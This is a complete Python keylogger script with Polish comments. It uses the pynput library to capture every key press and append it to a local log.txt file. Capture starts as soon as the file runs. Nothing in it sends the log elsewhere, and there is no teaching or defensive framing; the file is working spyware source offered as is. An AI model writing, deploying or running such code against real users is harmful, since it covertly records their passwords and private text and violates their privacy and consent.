import pynput.keyboard

class SimpleKeyLogger:
    def __init__(self):
        self.logger = ""
    def append_to_log(self, key_strike):
        self.logger = self.logger + key_strike
        with open ("log.txt", "a+", encoding="utf-8") as new_file:    #write to text file
            new_file.write(self.logger)
        #print(self.logger)
        self.logger = ""

    def evaluate_keys(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:  # Litera lub cyfra
                Pressed_key = key.char
            elif key == pynput.keyboard.Key.space:  # Spacja
                Pressed_key = " "
            else:  # Klawisz specjalny
                Pressed_key = f' "{key.name}" '
        except ArithmeticError:
            if key == key.space:
                Pressed_key = " "
            else:
                Pressed_key = " " + str(key) + " "
        self.append_to_log(Pressed_key)
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            self.logger = ""
            keyboard_listener.join()
    
SimpleKeyLogger().start()